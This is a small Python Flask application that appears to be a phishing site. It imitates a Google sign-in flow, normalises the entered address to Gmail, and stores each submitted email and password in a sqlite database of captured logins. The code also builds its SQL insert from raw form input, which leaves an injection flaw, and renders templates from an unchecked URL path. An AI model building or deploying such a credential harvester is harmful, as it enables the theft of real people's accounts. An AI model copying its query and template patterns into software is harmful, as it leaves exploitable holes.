from flask import Flask, render_template, request,session
import sqlite3
import re

app=Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route("/gauth",methods=['POST'])
def glogin():
    mail=request.form['identifier']
    print('\n\n\n',mail,'\n\n\n')
    if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
    return render_template('googlepass.html',act=mail)

@app.route("/share",methods=['POST'])
def share():
    email=request.form['email']
    passwd=request.form['pass']
    con=sqlite3.connect('static/ff-user.db')
    cur=con.cursor()
    cur.execute(f"insert into user(username,password) values('{email}','{passwd}')")
    con.commit()
    con.close()
    return render_template('share.html')

@app.route("/<name>",methods=['GET'])
def login(name):
    return render_template(f'{name}.html')

# @app.route('/db')
# def db():
#     try:
#         con=sqlite3.connect('static/ff-user.db')
#         cur=con.cursor()
#         cur.execute(f"create table user(id INTEGER PRIMARY KEY AUTOINCREMENT,username,password)")
#         con.commit()
#         con.close()
#         return "Database created"
#     except:return "Database Already exits"

if __name__=="__main__":
    app.run()